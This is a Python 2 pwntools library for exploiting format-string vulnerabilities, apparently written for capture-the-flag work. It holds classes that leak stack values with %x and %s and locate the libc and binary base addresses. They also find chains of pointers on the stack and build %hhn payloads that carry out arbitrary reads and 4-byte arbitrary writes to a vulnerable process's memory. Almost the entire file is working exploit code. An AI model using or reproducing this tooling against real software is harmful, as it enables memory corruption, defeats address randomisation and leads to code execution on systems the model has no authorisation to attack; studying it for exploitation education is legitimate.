#!/usr/bin/env python
# -*- coding: utf-8 -*-
# pasteBin
#
# bunch of functions to help exploit format strings


import sys
from pwn import *

context.log_level = 1337

# todo, make helper functions for cases when you need to put the program in a loop
# make a function to find the offset of your string on the stack
# make better use of the ELF functions
    # might not even need libc cuz it's in binary.libs
    # should use that
# extract the pointer finding magic into it's own function and tidy up the valid function
# highlight what pointers are writeable and make shit pretty

class FormatStringPointer(object):
    """
        This is a value on the stack
        this class is designed to keep track of it's offset, value and 
        what it points to

        if you give it libc and a binary it'll also workout what it points to 
    """

    def __init__(self, formatString, offset, value=None, string=None):

        """
            There are a horrendous amount of edge cases
            e.g 
            this points to a pointer on the stack that also is valid assembly that
            occurs in libc.
            I am not even gunna try to account for that
        """
        # this is a the parent formatString class
        self.formatString = formatString 
        # the offset needed in the format string to get this
        self.offset = offset
        # the value that you get when you %x this thing
        self.value = value
        # this is what this supposedly points to
        self.string = string
        # if this points to something in libc, this is the offset, or the pointer on the stack
        self.pointer_offset = None
        # how long of a chain points to this thing
        self.chain_len = 0 
        # just a plain 'ol number .. for now!
        self.pointer_type = "number"
        # this can only point to one thing 
        self.next = None
        # but many things can point to it I suppose ... errgh complexity
        self.prev = []
        # if you gave me a string I'll work out if it's important
        if string and len(string) > 1:
            self.update_deref(string)

    def set_next(self, pointer):
        """
            if I find the pointer that this points to on the stack
            set this.next to that pointer
        """
        # keep track of which pointer this points to
        self.next = pointer
        # increase the chain length, if it gets to 2 then we get free write/read
        pointer.chain_len = self.chain_len + 1
        # add me to the list of pointers that point to this fella
        pointer.prev += [self] 

    def update_value(self, value):
        """
            this is called if you have a pointer
            that points to this and it just changed me
            in that case you know that you know where everything is
            on the stack 
        """
        # I might want to save what offset I point to or something

        diff = value - self.value
        self.pointer_offset += diff
        self.value = value


    def points_to(self):
        """
            return the int value this points to NO REFRESH
        """
        if self.string == None or len(self.string) == 0:
            # print "DEREF NULL"
            return 0

        pointer_len = 4 if self.formatString.bits == 32 else 8


        str_trunk_lst = self.string[:pointer_len]
        rev_lst = [x.encode('hex') for x in str_trunk_lst ][::-1]
        strthing = ''.join(rev_lst)
        ptr = int("0x" + strthing ,16)
        return ptr

    def update_deref(self, string):
        """
            Give me the thing I point to
            and I'll work out wtf it is
        """
        self.string = string
        # find if it points to libc of Code
        if len(string) > 1: # only worth checking for more than 1 byte leaked
            # search for the string in libc
            code_segments = []
            libc_len = 0
            code_len = 0
            if self.formatString.libc and hex(self.value)[:4] != "0x80": # cuz nah
                libc_results = list(self.formatString.libc.search(string))
                libc_len = len(libc_results)
                code_segments += libc_results
            if self.formatString.binary:
                # convert unprintable chars into wildcards .{,3} upto 3
                # could be awekward if there is a couple .'s at the start
                # since we are probably leaking return pointers, we could look for
                # call instructions just behind them
                # we'll see if it's an issue
                # maybe find the vague region, find the last call inst
                # then you know we are pointing to the next instructions

                findable = string.encode('hex').replace('efbfbd', '.')
                code_results = list(self.formatString.binary.search(string))
                # if self.pointer_type == "code":
                    # print "this is what it really points to"
                    # print binary.data[self.pointer_offset:self.pointer_offset+8]
                code_len = len(code_results)
                code_segments += code_results

            # is it unique?
            if len(code_segments) == 1:
                self.pointer_offset = code_segments[0]
                if libc_len != 0:
                    self.pointer_type = "libc"
                    print "FOUND LIBC!"
                    if not self.formatString.libc_fixed:
                        self.formatString.libc.address = self.value - self.pointer_offset
                    else:
                        if self.value - self.pointer_offset != 0:
                            print "ERROR" # could be usefull in binary case
                        else:
                            print "further affirmation of our excellence" 

                    self.formatString.libc_fixed = True
                elif code_len != 0:
                    self.pointer_type = "code"
                    print "FOUND THE BINARY!"
                    if not self.formatString.binary_fixed:
                        print self.formatString.binary.address
                        # maybe add the entry point of something
                        self.formatString.binary.address = self.value - self.pointer_offset
                    else:
                        if self.value - self.pointer_offset != 0:
                            print "ERROR"
                        else:
                            print "further affirmation of our excellence" 
                    self.formatString.binary_fixed = True
                else:
                    raise "ERROR: WTF CODE IS WRONG HERE"  

            elif len(code_segments) == 0: 

                pointer_len = 4 if self.formatString.bits == 32 else 8
                # maybe it's a pointer on the stack?
                if len(string) >= pointer_len: # pointer_len bytes for a pointer
                    # make an array of the bytes in the pointer, little endian style
                    ptr = [ord(x) for x in string[:pointer_len]][::-1]
                    # convert the value into a string of bytes
                    my_ptr = self.formatString.decompose_data(self.value)[::-1]

                    # get rid of 0's at the front
                    while ptr[0] == 0:
                        ptr = ptr[1:]
                    while my_ptr[0] == 0:
                        my_ptr = my_ptr[1:]

                    if ptr[:2] == my_ptr[:2]: # if the first 2 bytes match
                        # this actually tells me a lot,
                        # if I can find the thing this points to
                        # I can work out the address of everything 
                        # on the stack around me
                        self.pointer_type = "stack"
                        self.pointer_offset = self.value # points to yeahhh. the stuff
                        # let the formatString workout what we point to



    def write(self, byte):
        """
            write this byte using this pointer,
            todo: update my string
        """
        payload = self.formatString.set_cur_val(byte)
        payload += "%{0}$hhn".format(self.offset)
        self.string[0] = byte
        if self.next:
            self.next.update_value(self.points_to())
        return payload


    def valid(self):
        """
            if I've allready been assesd as having a type other than just 'number'
            then i'm a valid poitner

            try searching in libc/binary if we know the offset

            otherwise just ballpark guess if something is a pointer, adjust to taste
            helps it to not crash :D


            This needs to be changed, I need a function that works out where a pointer 
            points to and stuff using the binary
        """

        if self.pointer_type != "number":
            return True

        # don't want any nulls slipping through
        if self.value == 0:
            return False # null case
            
        if self.offset in self.formatString.bad_offsets:
            return False

            
        if self.value in self.formatString.bad_values:
            return False


        # if we have the binary leaked (or no aslr)
        # we can easily check if this pointer points to something in there
        if self.formatString.binary and self.formatString.binary_fixed:
            off = self.formatString.binary.vaddr_to_offset(self.value)
            if off != None:
                self.pointer_type = "code"
                self.pointer_offset = off
                return True

        # if we have libc leaked we can easily check if this pointer 
        # points to something in there
        if self.formatString.libc and self.formatString.libc_fixed:
            off = self.formatString.libc.vaddr_to_offset(self.value)
            if off != None:
                self.pointer_type = "libc"
                return True



        if hex(self.value)[:3] != "0x7" and \
        hex(self.value)[:3] != "0x5" and \
        hex(self.value)[:3] != "0xf" and \
        hex(self.value)[:4] != "0x80":
            return False


        # print hex(self.value)

        # I admit this isn't the best solution, but it works
        # well, so long as you don't have a ropchain at 0x780000
        if hex(self.value)[:4] == "0x78": # Y in asci,
            return False

        if "0000" in hex(self.value): # too many 0's probs not legit
            return False

        if "ffffffff" in hex(self.value): # too many f's probs not legit
            return False


        if "4141" in hex(self.value): # hahah I legit need this
            return False

        dLen = len(hex(self.value))

        # some example pointer lengths
        if dLen != len("0x55f55d09d6a0") and \
        dLen != len("0x63b944c753c6fc00") and self.formatString.bits == 64:
            return False

        if dLen != len("0xaabbccdd") and \
        dLen != len("0x804ccdd") and self.formatString.bits == 32:
            return False

        return True

class FormatStringLeaker(object):
    """
        This class helps you manage your format string vuln
        you give it a format string and it'll help manage things

        you give it a function that takes a format string and returns
        what the format string turns into
    """

    def __init__(self, format_func=None, get_fmt=None, conn=None, libc=None, binary=None, bits=32, bad_offsets=[], bad_values=[]):
        """
            format_func takes a string and returns the formated output
            from the target binary

            if you can't call it multiple times, you'll need to try and
            put the program in a loop

            takes a pwntools ELF binary as libc and binary


        """

        if format_func == None and conn == None:
            raise "You can't give neither! I need SOMETHING to work with geez"

        # this function does the format string 
        self.format_func = format_func

        # just pwntools connection
        self.conn = conn

        # my magical pointers
        self.leaks = []
        # num bytes printed so far
        self.current_val = 0
        self.bits = bits # 32 or 64
        self.chain_starter = None
        self.binary = binary
        self.libc = libc
        # set these to true if we find a leak
        self.libc_fixed = False
        self.stack_found = False
        self.binary_fixed = False
        self.stack_start = None # this + offset*pLen = addr of offset
        #bad offsets are offsets that should not be derefed
        self.bad_offsets = bad_offsets
        #bad values are values that should not be derefed, e.g stack cooies (if you know them)
        self.bad_values = []
        for offset in bad_offsets:
            self.bad_values += [self.dump_offset(offset)]

        # the binary will just be in it's spot
        if not self.binary.aslr:
            self.binary_fixed = True



    def extract_printf(self, refs):
        """
            Given a list of refs e.g %x, %llx, %10$s
            return a list of the things they return
        """

        # leak the 'r'th thing off the stack
        gen_ref = lambda r: "*{ref}*".format(ref=r)

        # generate a few of these in a row
        payload = "*"
        payload += ''.join([gen_ref(r) for r in refs])
        payload += "*OO"

        leaks = self.format_func(payload)
        leaks = leaks.split('**')[1:-1] # remove the OO  and the empty start
        return leaks

    # get one offset
    def dump_offset(self, offset):
        """
            Leak the value at an offset using the format string
        """

        if self.bits == 32:
            code_leak_payload = lambda r: "%{ref}$x".format(ref=r)
        else:
            code_leak_payload = lambda r: "%{ref}$llx".format(ref=r)
        return int(self.extract_printf([code_leak_payload(offset)])[0],16)

    # leak a pointer string
    def deref_offset(self, offset):
        """
            Leak what an offset value points to using %s
        """
        # todo: consider updating our leaks when we do stuff
        # but maybe they change so errrgh we'll see how it goes

        code_leak_payload = "%{ref}$s".format(ref=offset)
        return self.extract_printf([code_leak_payload])[0]

    # get a few values
    def dump_offset_list(self, offset, length):
        """
            dump a list of offsets from the stack
        """
        # leak the 'r'th thing off the stack
        if self.bits == 32:
            offset_str = lambda r: "%{ref}$x".format(ref=r)
        else:
            offset_str = lambda r: "%{ref}$llx".format(ref=r)

        refs = [offset_str(x) for x in range(offset, offset + length)]
        ret = [ int(x,16) for x in self.extract_printf(refs)]
        return ret


    # get a few strings (dereferenced pointers)
    def deref_offset_list(self, offsets):
        """
            Deref a list of offsets as strings using %s
        """
        # leak the 'r'th thing off the stack
        offset_str = lambda r: "%{ref}$s".format(ref=r)
        refs = [offset_str(x) for x in offsets]
        ret = [ x for x in self.extract_printf(refs)]
        return ret


    def leak_more(self, amount=10):
        """
            Leak more pointers and shit,
            print out as we go 
        """

        leak_len = len(self.leaks)
        pointers = self.dump_offset_list(len(self.leaks) + 1, amount)
        will_deref = []
        for pos, pointer in enumerate(pointers):
            offset = pos + leak_len + 1
            leak = FormatStringPointer(self, offset, value=pointer)
            self.leaks += [leak]
            if leak.valid():   
                will_deref += [leak]
        offsets = [leak.offset for leak in will_deref]
        print offsets
        print [hex(leak.value) for leak in will_deref]
        if len(will_deref) == 0:
            return

        strings = self.deref_offset_list(offsets)

        # match up the leaks with their strings
        for leak, string in zip(will_deref, strings):
            leak.update_deref(string)


        pointer_len = 4 if self.bits == 32 else 8
        if not self.stack_found:
            for leak in self.leaks:
                if leak.pointer_type == "stack":
                    # check all the leaks to see if we have found it
                    for leak_2 in self.leaks:
                        if leak_2.value == leak.points_to():
                            leak.set_next(leak_2)
                            self.stack_found = True
                            self.stack_start = leak.value - leak_2.offset*pointer_len
                            break
        else:
            for leak in self.leaks:
                if leak.value > self.stack_start:
                    leak.pointer_type = "stack"
                    points_to_offset = (leak.value - self.stack_start)/pointer_len
                    if points_to_offset < len(self.leaks):
                        for leak_2 in self.leaks:
                            if leak_2.offset == points_to_offset:
                                leak.set_next(leak_2)
                                if leak_2.chain_len >= 2:
                                    # get the leak that is the start of the chain
                                    # well, not the actuall start if it's longer than 2
                                    # but that's all we need
                                    self.chain_starter = leak_2.prev[0].prev[0]
                                    print "A chain of pointers has been found"
                                    print "this can be used to do arbitrary read/writes"
                                    print "Offsets: {0}->{1}->{2}".format(
                                        self.chain_starter.offset,
                                        leak.offset,
                                        leak_2.offset)
                                break
                        else:
                            print "WEIRD ERRORS"




    def find_libc_offset(self):
        """
            1) Leak memory using the format string
            2) Find the valid pointers/offsets
            3) Deref them and compare with libc
            4) if match, calculate offset

            uses pwntools' ELF library

            should probably make it stop after a while but whatevs
        """
        # leak a big range and then deref all the pointers till you find one in libc
        # then adjust the offset

        while True:
            self.leak_more()
            # all handled by the pointers, cheers bros :D


    def set_cur_val(self, a):
        """
            ~~~ IMPORTANT ~~
            the %n operator write the number of bytes written so far 
            %hhn writes one byte (0x00 -> 0xff)

            This function returns the minimal payload required
            to print out enough whitespace to get the number
            of characters printed to the desired value

            To do this it uses a global counter called 'self.current_val'
            which represents the number of bytes written so far
        """

        # Work out how much whitespace we need to overflow
        # the least significant byte to 0x00
        gets_to_zero = 256 - self.current_val # add this to get to 0x00

        # then add the amount required to get to the desired value
        gets_to_destination = gets_to_zero + a 

        # since it's 1 byte it doesn't make sense to use more than 256 characters
        inc = gets_to_destination%256 # adding > 256 is the same as adding 0 so mod 256

        # update the number of bytes printed
        self.current_val = a
        # if we don't have to increment then just return an empty string
        if inc == 0: # %0c is the same as %1c so if it's 0 difference then just print nothing
            return "" 
        return "%1$" + str(inc) + "c" 

    def payload_write_data_to_addr(self, data, addr):
        """
            Writes 4 bytes of your choice to the address given
            This is the back bone of this exploit

            Finikey as fuck
        """

        # remove '0x' and convert to little endian
        # 0xaabbccdd -> ddccbbaa 
        # 0x12345678 -> 87654321
        hexStr = hex(data)[2:][::-1] 


        # ddccbbaa -> [dd, cc, bb, aa]
        # 87654321 -> [78, 56, 34, 12]
        byteList = [ hexStr[i:i+2][::-1] for i in xrange(0, len(hexStr), 2) ]

        # convert from hex strings to data
        bytes = [int(x,16) for x in byteList]

        # need to offset the payload by 1 byte
        # took me 3 fucking hours to work that out
        payload = "A" 

        # we are going to write to the 4 bytes of 
        # our address. E.G if we got data:0xa1b2c3d4 addr: 0xffb7aa00
        # we would write the following bytes to the addresses below:
        # 0xffb7aa00 : d4
        # 0xffb7aa01 : c3
        # 0xffb7aa02 : b2
        # 0xffb7aa03 : a1
        # 
        # 0xffb7aa00  == d4c3b2a1
        # (int) * 0xffb7aa00  == 0xa1b2c3d4
        # add our addresses to the start of the format string
        for a in range(len(bytes)):
            payload += p32(addr + a) 

        # this is the offset of the first address in our string
        # it also took a while to work out
        offset = 7 

        # set the number of bytes written to be the current length of
        # our payload
        self.current_val = len(payload)

        # this takes the a'th byte index of the address you want to 
        # write to, and writes the number of bytes printed there
        write_to_byte = lambda a: "%{0}$hhn".format(a + offset)

        # for each byte, set the least significant byte of the
        # value for the number of bytes written
        # and write that to the address
        for pos, byte in enumerate(bytes):
            payload += self.set_cur_val(byte) + write_to_byte(pos)

        # return the payload string to use
        return payload


    def payload_read_addr(self, addr):
        """
            Leak the value at address (addr)
            put it in a print statement in between ':::'
            to make finding it easier
        """

        # necessary offset
        payload = "A" 

        # just writing the address
        payload += p32(addr)

        # this is the offset of the first address in our string
        offset = 7 
        self.current_val = len(payload)

        payload += ":::%{0}$s:::".format(offset)

        return payload


    def off_write(self, offset, byte): # use the ponter intstead
        """
            write this byte using this pointer,
            todo: update my string
        """
        payload = self.set_cur_val(byte)
        payload += "%{0}$hhn".format(offset)
        return payload


    def decompose_data(self, data):
        """
            take a number, break it down so it looks like a string
        """
        hexStr = hex(data)[2:][::-1] # little endian
        # if len(hexStr) %2 != 0:
        #   hexStr = '0' + hexStr
        byteList = [ hexStr[i:i+2][::-1] for i in xrange(0, len(hexStr), 2) ]
        bytes = [int(x,16) for x in byteList]
        return bytes


    def write_and_prep_next(self, offsets, byte, next_lsb):
        """
            |can't change|  |change LSB|  |full control|
            |____________|__|__________|__|____________|
            |   offset1  |->|  offset2 |->|  offset3   |
            ____________________________________________

            use offset1 to change the LSB of offset2
            use offset2 to change all the bytes of offset3
            use offset3 to write wherever


            this function writes byte to offset 3 using offset2
            and increases offset2 by 1 by writing to it's LSB using 
            offset 1, which prepares it for the next write
        """
        self.current_val = 0
        # write the current value
        payload = self.off_write(offsets[1], byte)
        # prepare our wiggle ninja pointer for the next format string
        payload +=self.off_write(offsets[0], next_lsb)

        return payload

    def payload_chain_offsets(self, offsets, address, data):
        """
            Generate a payload that chains together 
            a few offsets to write 

            address is the address of the second pointer
        """
        lsbAddr3 = self.decompose_data(address)[0]
        bytes = self.decompose_data(data)
        payload = partial(self.write_and_prep_next, offsets=offsets)
        next_lsbs = [lsbAddr3 + x for x in [1,2,3,0]]
        arr = [payload(byte=b, next_lsb=l) for b,l in zip(bytes,next_lsbs)]
        return arr

    def arbitrary_write(self, addr, data):
        """
            this requires multiple format hits so it just returns
            an array of payloads that you need to have execute sequentially
            can't be calling other stuff inbetween or things might break
        """
        if not self.chain_starter:
            raise "U NO HAVE THIS POWER"
            return
        # these are the two staring offsets of the chain
        # the third is the one that you'll end up using to write the data
        offset1 = self.chain_starter.offset
        offset2 = self.chain_starter.next.offset
        offset3 = self.chain_starter.next.next.offset

        # run these payloads to accomplish your dreams of arbirtary writing
        payloads  = self.payload_chain_offsets(
            data=addr,                         # write the address you want to offset 3
            offsets=[offset1, offset2],           # use the first 2 to do this
            address=self.chain_starter.next.value # the address is the address of the 3rd offset
        )

        payloads += self.payload_chain_offsets(
            data=data,                      # this is the data that you want to write
            offsets=[offset2, offset3],     # use the 2nd and 3rd offsets
            address=addr                 # this is the addres to write to
        )

        return payloads
